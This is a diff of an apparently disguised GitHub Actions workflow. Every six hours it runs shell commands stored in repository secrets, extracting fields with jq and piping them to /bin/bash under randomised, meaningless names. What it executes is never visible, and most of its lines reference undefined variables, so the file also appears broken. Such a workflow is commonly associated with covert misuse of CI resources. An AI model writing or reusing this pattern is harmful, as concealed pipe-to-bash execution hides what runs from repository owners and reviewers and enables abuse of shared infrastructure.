@@ -2,7 +2,7 @@ name: ruanxiaowu19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '45 1/6 * * *'
 
 jobs:
   build:
@@ -11,17 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          fy70: ${{ secrets.fy70 }}
+          eadlp691: ${{ secrets.eadlp691 }}
         run: |
-          echo $fy70 | jq -r .mear2 | /bin/bash
-          echo $eavv0964 | jq -r .sxbp353 | /bin/bash
-          echo $kptjv7761 | jq -r .z479 | /bin/bash
-          echo $hzhgd48 | jq -r .pygk19622 | /bin/bash
-          echo $tfzob1 | jq -r .sas40261 | /bin/bash
-          echo $f51503 | jq -r .kalj13 | /bin/bash
-          echo $bfee22653 | jq -r .pzu5 | /bin/bash
-          echo $vxk6353 | jq -r .h78946 | /bin/bash
-          echo $fx71 | jq -r .wr70 | /bin/bash
-          echo $jcigs02 | jq -r .loifo1 | /bin/bash
-          echo $wu5 | jq -r .sc89271 | /bin/bash
+          echo $eadlp691 | jq -r .ex955 | /bin/bash
+          echo $bvt938 | jq -r .ah9934 | /bin/bash
+          echo $ivki0023 | jq -r .ztyd85433 | /bin/bash
 
